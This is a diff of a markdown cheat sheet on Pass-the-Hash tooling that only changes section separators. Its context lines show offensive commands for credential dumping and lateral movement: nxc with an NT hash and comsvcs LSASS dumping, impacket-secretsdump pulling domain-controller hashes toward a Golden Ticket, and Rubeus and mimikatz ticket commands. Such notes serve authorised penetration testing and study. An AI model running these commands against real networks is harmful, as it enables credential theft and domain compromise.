@@ -20,7 +20,7 @@ linked:
 ---
 # Pass-the-Hash - Tooling
 
-***
+---
 
 ## netexec / crackmapexec
 
@@ -38,7 +38,7 @@ linked:
 | `nxc smb <target> -u user -H <NT> -M comsvcs` | comsvcs.dll MiniDump | Stealth dump. |
 ^pth-tool-nxc
 
-___
+---
 
 ## Impacket
 
@@ -62,7 +62,7 @@ impacket-secretsdump corp.local/atacante@<DC> -hashes :aabbcc... -just-dc
 # Output: krbtgt hash → Golden Ticket
 ```
 
-___
+---
 
 ## evil-winrm
 
@@ -75,7 +75,7 @@ ___
 | `upload <local-file>` / `download <remote>` | File transfer | Standard. |
 ^pth-tool-evilwinrm
 
-___
+---
 
 ## mimikatz
 
@@ -91,7 +91,7 @@ ___
 | `mimikatz # kerberos::purge` | Clear tickets | Cleanup. |
 ^pth-tool-mimi
 
-___
+---
 
 ## Rubeus
 
@@ -106,7 +106,7 @@ ___
 | `Rubeus.exe monitor /interval:5 /targetuser:DC01$` | Live TGT monitor (UD chain) | Live capture. |
 ^pth-tool-rubeus
 
-___
+---
 
 ## pth-suite (Linux Legacy)
 
@@ -120,7 +120,7 @@ ___
 
 **Status:** legacy suite (pre-Impacket era). Funciona pero deprecated en favor de nxc/Impacket.
 
-___
+---
 
 ## xfreerdp (Linux RDP)
 
@@ -133,7 +133,7 @@ ___
 
 **Caveat:** target requires `DisableRestrictedAdmin = 0` registry. NO funciona out-of-the-box modern.
 
-___
+---
 
 ## Recursos
 
@@ -150,4 +150,4 @@ ___
 | MITRE ATT&CK T1550.002 | `https://attack.mitre.org/techniques/T1550/002/` |
 ^pth-tool-resources
 
-***
+---
